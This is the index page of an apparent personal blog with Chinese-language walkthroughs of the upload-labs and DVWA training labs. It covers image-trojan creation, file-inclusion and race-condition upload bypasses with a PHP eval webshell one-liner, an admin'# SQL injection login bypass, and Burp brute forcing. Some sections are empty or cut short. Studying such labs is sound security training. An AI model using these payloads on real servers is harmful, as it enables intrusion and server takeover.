<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/28/blog/" class="article-date">
  <time datetime="2021-02-28T11:26:47.000Z" itemprop="datePublished">2021-02-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/28/blog/">blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/28/blog/" data-id="cklp2jfla000380vub1tuegar" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="blog-dvwa-1" class="article article-type-blog" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/25/dvwa-1/" class="article-date">
  <time datetime="2021-02-25T12:24:15.000Z" itemprop="datePublished">2021-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/25/dvwa-1/">dvwa</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/25/dvwa-1/" data-id="cklku9eoe00001gvu1j9e5x64" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-upload-labs-pass14-21" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/20/upload-labs-pass14-21/" class="article-date">
  <time datetime="2021-02-20T04:27:30.000Z" itemprop="datePublished">2021-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/20/upload-labs-pass14-21/">upload-labs-pass14-21</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从pass-14开始都是图片马搭配文件包含漏洞。</p>
<ul>
<li><strong>图片马的制作</strong></li>
</ul>
<p>使用cmd制作图片马：<strong>copy 1.jpg/b+1.php 2.jpg</strong>——意思是将1.jpg以二进制方式与1.php合并成2.jpg，这个2.jpg就是图片马了。</p>
<ul>
<li><strong>文件包含漏洞</strong></li>
</ul>
<p>-》文件包含简介：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当作PHP来执行。</p>
<p>-》文件包含函数：PHP中文件包含函数有以下四种：</p>
<p>1.require()；2.require_once()；3.include()；4.include_once()</p>
<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p>-》文件包含漏洞原理：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p>示例代码：</p>
<ol>
<li><pre><code class="php"> &lt;?php
     $filename  = $_GET[&#39;filename&#39;];
     include($filename);
 ?&gt;
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395</span><br><span class="line"></span><br><span class="line"># pass-14：文件头检查绕过</span><br><span class="line"></span><br><span class="line">* 查看源码，发现服务器只检查文件内容的前两个字节</span><br><span class="line"></span><br><span class="line">补充：一般文件内容的前两个字节会体现出自己是什么类型的文件（可以用winhex查看）。</span><br><span class="line"></span><br><span class="line">因此本pass直接上传图片马即可绕过了。</span><br><span class="line"></span><br><span class="line">* 图片马的利用：</span><br><span class="line"></span><br><span class="line">  一般图片马是无法直接连接蚁剑的，那么我们可以搭配文件包含漏洞来操作服务器。点开pass-14注意2的文件包含漏洞网页，url栏输入：?file&#x3D;.&#x2F;upload&#x2F;文件名![2](upload-labs-pass14&#x2F;2.png)</span><br><span class="line"></span><br><span class="line"># pass-15：突破getimagesize()</span><br><span class="line"></span><br><span class="line">查看源码：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;根据索引2的值转换为对应后缀</span><br><span class="line">        if(stripos($types,$ext)&gt;&#x3D;0)&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></code></pre>
</li>
</ol>
<ul>
<li><strong>新函数：</strong></li>
</ul>
<p>—）getimagesize()</p>
<p>功能：用于获取图像大小及相关信息，成功返回一个数组（成员为索引0、1、2、3等等），失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
<ol>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签</li>
</ol>
<p>菜鸟教程实例：<img src="/.com//3.png" alt="3"></p>
<p>那么这关也是直接上传图片马即可绕过。</p>
<h1 id="pass-16：突破exif-imagetype"><a href="#pass-16：突破exif-imagetype" class="headerlink" title="pass-16：突破exif_imagetype()"></a>pass-16：突破exif_imagetype()</h1><ul>
<li><p>exif_imagetype()函数：</p>
<p>功能：读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。这个签名（也可以称为值）和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。</p>
</li>
</ul>
<p><img src="/.com//4.png" alt="4"></p>
<p>那么这关也是直接上传图片马即可绕过。</p>
<h1 id="pass-17：二次渲染绕过"><a href="#pass-17：二次渲染绕过" class="headerlink" title="pass-17：二次渲染绕过"></a>pass-17：二次渲染绕过</h1><h1 id="pass-18：条件竞争——时间型"><a href="#pass-18：条件竞争——时间型" class="headerlink" title="pass-18：条件竞争——时间型"></a>pass-18：条件竞争——时间型</h1><ul>
<li>代码审计：服务器先上传了图片，再判断后缀是否符合，符合则重命名，不符合则删除。</li>
</ul>
<p>那么我们可以发现在我们上传了不符合的图片服务器保存到其删除肯定会有时间差的，那么我们就可以利用这一时间差进行我们的操作：上传新的一句话木马：</p>
<p>&lt; ?php fputs(fopen(‘shell.php’,’w’),’&lt; ?php @eval($_POST[“pass”])?&gt;’);?&gt;</p>
<ul>
<li><p>新函数：</p>
<p>—）<strong>fputs() 函数</strong>——别名fwrite</p>
<p>功能：写入文件（可安全用于二进制文件）</p>
<p>语法：fputs(file,string,length)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>file</td>
<td>必需。规定要写入的打开文件。</td>
</tr>
<tr>
<td>string</td>
<td>必需。规定要写入文件的字符串。</td>
</tr>
<tr>
<td>length</td>
<td>可选。规定要写入的最大字节数。</td>
</tr>
</tbody></table>
<p>—）<strong>fopen()函数</strong></p>
<p>功能：打开文件或者 URL。</p>
<p>语法：fopen(filename,mode,include_path,context)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>filename</td>
<td>必需。规定要打开的文件或 URL。</td>
</tr>
<tr>
<td>mode</td>
<td>必需。规定要求到该文件/流的访问类型。可能的值见下表。</td>
</tr>
<tr>
<td>include_path</td>
<td>可选。如果也需要在 include_path 中检索文件的话，可以将该参数设为 1 或 TRUE。</td>
</tr>
<tr>
<td>context</td>
<td>可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td>
</tr>
</tbody></table>
</li>
</ul>
<p>其中mode可选的类型有：</p>
<table>
<thead>
<tr>
<th align="left">mode</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">“r”</td>
<td align="left">只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="left">“r+”</td>
<td align="left">读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="left">“w”</td>
<td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td align="left">“w+”</td>
<td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td align="left">“a”</td>
<td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td align="left">“a+”</td>
<td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td align="left">“x”</td>
<td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。</td>
</tr>
<tr>
<td align="left">“x+”</td>
<td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。</td>
</tr>
</tbody></table>
<ul>
<li>把这个php文件通过burp一直不停的上传，总会有那么一瞬间是还没来得及删除就可以被访问到的（可以通过增加burpsuite线程来提高几率），一旦访问到该文件就会在当前目录下生成一个webshell2.0.php的一句话，然后用蚁剑连接shell.php即可。</li>
</ul>
<h1 id="pass-19：条件竞争"><a href="#pass-19：条件竞争" class="headerlink" title="pass-19：条件竞争"></a>pass-19：条件竞争</h1><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><ul>
<li>代码审计：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">       $is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>新函数：</li>
</ul>
<p>—）<strong>pathinfo()函数</strong></p>
<p>功能：以数组的形式返回文件路径的信息</p>
<p>语法：pathinfo(path,process_sections)</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">path</td>
<td>必需。规定要检查的路径。</td>
</tr>
<tr>
<td align="left">process_sections</td>
<td>可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirname（目录路径）PATHINFO_BASENAME - 只返回 basename（文件名）PATHINFO_EXTENSION - 只返回 extension（文件名后缀）</td>
</tr>
</tbody></table>
<p>感觉这关就是前面的黑名单绕过，打组合拳就好了。</p>
<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><ul>
<li><strong>代码审计：</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>新函数：</strong></li>
</ul>
<p>—）<strong>empty()函数</strong></p>
<p>功能：用于检查一个变量是否为空。</p>
<p>—）<strong>explode()函数</strong></p>
<p>功能：把字符串打散为数组。</p>
<p>语法：explode(separator,string,limit)</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>separator</em></td>
<td align="left">必需。规定在哪里分割字符串。</td>
</tr>
<tr>
<td align="left"><em>string</em></td>
<td align="left">必需。要分割的字符串。</td>
</tr>
<tr>
<td align="left"><em>limit</em></td>
<td align="left">可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 <em>limit</em> 个元素的数组；小于 0 - 返回包含除了最后的 -<em>limit</em> 个元素以外的所有元素的数组；0 - 返回包含一个元素的数组</td>
</tr>
</tbody></table>
<p>—）<strong>is_array() 函数</strong></p>
<p>功能：用于检测变量是否是一个数组。</p>
<p>—）<strong>end()函数</strong></p>
<p>功能：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</p>
<p>语法：end(array)</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>array</em></td>
<td align="left">必需。规定要使用的数组。</td>
</tr>
</tbody></table>
<p>相关的函数：</p>
<ol>
<li>current() - 返回数组中的当前元素的值</li>
<li>next() - 将内部指针指向数组中的下一个元素，并输出</li>
<li>prev() - 将内部指针指向数组中的上一个元素，并输出</li>
<li>reset()- 将内部指针指向数组中的第一个元素，并输出</li>
<li>each() - 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ol>
<ul>
<li>我们可以看到服务器先对上传的图片进行了MIME检查，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给$file。接着判断$file是否是数组，如果不是数组则拆除数组，将数组的最后一个元素（也就是后缀）和允许上传文件后缀相比，若符合则取$file数组的第一个元素加<code>.</code>和$file的第二个元素作为新的文件名，并将图片文件上传到指定路径。</li>
<li>补充知识：对于像<code>.php/.</code>这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的<code>/.</code>。如此一来我们上传到服务器的文件还是被重命名为了php后缀。</li>
<li>那么这关我们的想法是：提前将save_name设置为数组，即令<code>save_name[0]=webshell.php/</code>、<code>save_name[2]=jpg</code>，其中save_name[1]的值为空。这样就可令<code>$file_name=webshell.php/.</code>。但是这边有个疑问，save_name数组的元素个数不是三个吗，$file[count($file) - 1]=$file[2]啊。但是其实我们只对数组赋值了两个元素，因此count的值为2，这就相当于你有3个口袋，但是只有两个口袋有钱。</li>
</ul>
<p>下面是实践：<img src="/.com//5-1614255649559.png" alt="5"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/20/upload-labs-pass14-21/" data-id="cklku9eok00011gvu09hn23ur" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-DVWA—Brute Force" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/16/DVWA%E2%80%94Brute%20Force/" class="article-date">
  <time datetime="2021-02-16T13:36:40.000Z" itemprop="datePublished">2021-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/16/DVWA%E2%80%94Brute%20Force/">DVWA—Brute Force</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该系列的实验主要围绕利用burpsuite的暴力破解。暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];  </span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];   </span><br><span class="line">$pass = md5( $pass );   </span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>; </span><br></pre></td></tr></table></figure>

<p>我们可以看到服务器对输入的账号密码没有做任何过滤处理，那么我们有两种方法：</p>
<p><strong>1)SQL注入</strong></p>
<p>输入username：admin’#，password：随便输。</p>
<p><strong>2)暴力破解</strong></p>
<p>输入目标账号和随意密码，抓包：</p>
<p>![1](DVWA—Brute Force/1.png)</p>
<p>send to intruder，清除标记，对希望爆破的值标记：![2](DVWA—Brute Force/2.png)</p>
<p>选择payload，载入字典：![3](DVWA—Brute Force/3.png)</p>
<p>start attack，我们可以看到当payload的值为password时回文的长度与众不同，因此我们得知用户admin的密码为password![4](DVWA—Brute Force/4.png)</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Login&#x27;</span>]))&#123; </span><br><span class="line">$user=$_GET[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">$user=mysql_real_escape_string($user); </span><br><span class="line">$pass=$_GET[<span class="string">&#x27;password&#x27;</span>]; </span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line">$query=<span class="string">&quot;SELECT*FROM`users`WHEREuser=&#x27;<span class="subst">$user</span>&#x27;ANDpassword=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们看到服务器对账号密码都做了过滤处理，对一些敏感字符进行了转义。实战中如果目标服务器的MySQL数据库采用gbk编码，那么我们可以里用宽字节绕过，但是我这边数据库没有这么设置，因此我们用SQL注入是不大可能实现了，我们接着看源码发现绕过我们输入了错误的账号密码，服务器也只会延迟网页两秒而已，不算有效的防爆破机制。一次本关仍使用暴力破解，具体同上一关。</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/16/DVWA%E2%80%94Brute%20Force/" data-id="cklp2jfkq000080vucr9ibqch" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-upload-labs-pass1-13" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/09/upload-labs-pass1-13/" class="article-date">
  <time datetime="2021-02-09T11:32:20.000Z" itemprop="datePublished">2021-02-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/09/upload-labs-pass1-13/">upload-labs-pass1—13</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>upload-labs主要是一些针对文件上传漏洞的实验。</p>
<p>再正式开始之前，先了解一下<strong>什么是文件上传漏洞？</strong></p>
<p><strong>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将，将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码——攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。然后利用渗透工具（如蚁剑）连接webshell以达到操作服务器的目的。</strong></p>
<ul>
